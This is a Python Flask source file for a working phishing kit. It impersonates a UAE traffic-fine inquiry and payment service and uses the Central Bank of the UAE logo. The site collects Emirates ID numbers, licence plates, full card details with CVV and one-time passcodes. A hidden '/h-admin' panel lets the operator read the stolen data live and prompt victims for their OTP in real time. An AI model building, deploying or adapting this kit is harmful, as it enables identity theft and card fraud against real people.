import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات التحكم (Live Control)
db = {"logs": [], "status": "waiting"}

# الهيدر الثابت الموحد لجميع الصفحات
HEADER = '<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;"></div>'

# --- 1. الصفحة الرئيسية (الـ 8 صور كاملة) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html {{ margin:0; padding:0; background:#f4f4f4; font-family: sans-serif; }}
    .content {{ max-width:650px; margin:0 auto; background:white; position:relative; box-shadow:0 0 20px rgba(0,0,0,0.1); }}
    img {{ width:100%; display:block; }}
    .btn-action {{ position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }}
</style>
</head>
<body>
    {HEADER}
    <div class="content">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <button class="btn-action" style="top:275px;" onclick="location.href='/search'"></button>
        <button class="btn-action" style="top:325px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (النسخة الجامبو الكاملة) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#f4f4f4; margin:0; font-family:sans-serif; }}
    .mega-card {{ background:white; width:95%; max-width:850px; margin:30px auto; border-radius:15px; box-shadow:0 15px 50px rgba(0,0,0,0.1); border-top:10px solid #b0914f; overflow:hidden; }}
    .form-body {{ padding:40px; }}
    label {{ display:block; margin-bottom:12px; font-weight:bold; font-size:18px; color:#333; }}
    select, input {{ width:100%; padding:18px; margin-bottom:25px; border:1px solid #ddd; border-radius:10px; font-size:17px; box-sizing:border-box; }}
    .plate-grid {{ display:grid; grid-template-columns: 1.5fr 1fr 2fr; gap:15px; }}
    .btn-search {{ background:#b0914f; color:white; border:none; padding:22px; width:100%; border-radius:10px; font-size:22px; font-weight:bold; cursor:pointer; }}
</style></head>
<body>
    {HEADER}
    <div class="mega-card">
        <div style="background:#b0914f; color:white; padding:30px; text-align:center; font-size:24px; font-weight:bold;">نظام الاستعلام عن المخالفات الموحد</div>
        <form action="/report" method="POST" class="form-body">
            <label>إمارة مصدر اللوحة / Plate Source:</label>
            <select name="emirate">
                <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
            </select>
            <label>بيانات اللوحة:</label>
            <div class="plate-grid">
                <select name="cat"><option>خصوصي</option><option>نقل عام</option><option>تجاري</option><option>دراجة</option></select>
                <input type="text" name="code" placeholder="الرمز">
                <input type="text" name="num" placeholder="رقم اللوحة">
            </div>
            <label>رقم الهوية الإماراتية:</label>
            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
            <button type="submit" class="btn-search">بدء البحث</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. بوابة الدفع (النسخة الفخمة المعتمدة) ---
PAY_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body {{ background:#eaebed; margin:0; font-family: 'Segoe UI', Arial; }}
    .pay-wrap {{ max-width:500px; margin:40px auto; background:white; border-radius:12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow:hidden; }}
    .pay-top {{ background:#fff; padding:20px; text-align:center; border-bottom:1px solid #eee; }}
    .pay-top img {{ height:50px; }}
    .pay-body {{ padding:30px; }}
    .amount-box {{ background:#f8f9fa; padding:15px; border-radius:8px; text-align:center; margin-bottom:25px; border:1px dashed #b0914f; }}
    input {{ width:100%; padding:16px; margin-bottom:20px; border:1px solid #dcdcdc; border-radius:6px; font-size:16px; box-sizing:border-box; outline:none; }}
    .submit-btn {{ background:#2c3e50; color:white; width:100%; padding:18px; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; }}
</style>
</head>
<body>
    {HEADER}
    <div class="pay-wrap">
        <div class="pay-top"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png"></div>
        <div class="pay-body">
            <div class="amount-box">المبلغ المستحق: <strong style="color:#2c3e50; font-size:24px;">255.00 AED</strong></div>
            <form action="/submit-card" method="POST">
                <input type="text" name="holder" placeholder="اسم حامل البطاقة" required>
                <input type="text" id="cn" name="card" placeholder="رقم البطاقة" maxlength="19" required>
                <div style="display:flex; gap:10px;">
                    <input type="text" name="exp" placeholder="MM / YY">
                    <input type="text" name="cvv" placeholder="CVV">
                </div>
                <button type="submit" class="submit-btn">تأكيد الدفع الآمن</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('cn').addEventListener('input', e => {{
            let v = e.target.value.replace(/\\s/g, '').replace(/(.{{4}})/g, '$1 ').trim();
            e.target.value = v;
        }});
    </script>
</body>
</html>
"""

# --- الأكواد الخلفية (السيرفر) ---

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/report', methods=['POST'])
def report():
    return render_template_string(f"{HEADER}<div style='text-align:center; padding:50px;'><h2>جاري استخراج بيانات المخالفة...</h2><script>setTimeout(()=>location.href='/checkout', 2000)</script></div>")

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/h-admin')
def admin():
    return render_template_string("""<body style="background:#111; color:white; padding:20px; font-family:sans-serif;">
    <h1>لوحة التحكم 👮‍♂️</h1><div id="logs"></div>
    <script>
        function load() {
            fetch('/get-logs').then(r => r.json()).then(data => {
                let h = '';
                data.logs.forEach(l => {
                    h += `<div style="border:1px solid gold; padding:15px; margin-bottom:10px;">
                    ${JSON.stringify(l)} <br>
                    <button onclick="act('go_otp')" style="background:green; color:white;">اطلب OTP</button>
                    <button onclick="act('error_card')" style="background:red; color:white;">رفض</button>
                    </div>`;
                });
                document.getElementById('logs').innerHTML = h;
            });
        }
        function act(s) { fetch('/set-status/' + s); }
        setInterval(load, 3000);
    </script></body>""")

@app.route('/submit-card', methods=['POST'])
def sub():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status']})

WAIT_JS = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp';
            if(d.status === 'error_card') { alert('البطاقة مرفوضة'); location.href='/checkout'; }
        });
    }, 3000);
</script>
<body style="text-align:center; padding-top:100px;"><h2>جاري التحقق...</h2></body>
"""

@app.route('/otp')
def otp(): return "<body><div style='text-align:center; padding:50px;'><h2>أدخل الرمز OTP</h2><form action='/submit-card' method='POST'><input name='otp'><button>تأكيد</button></form></div></body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
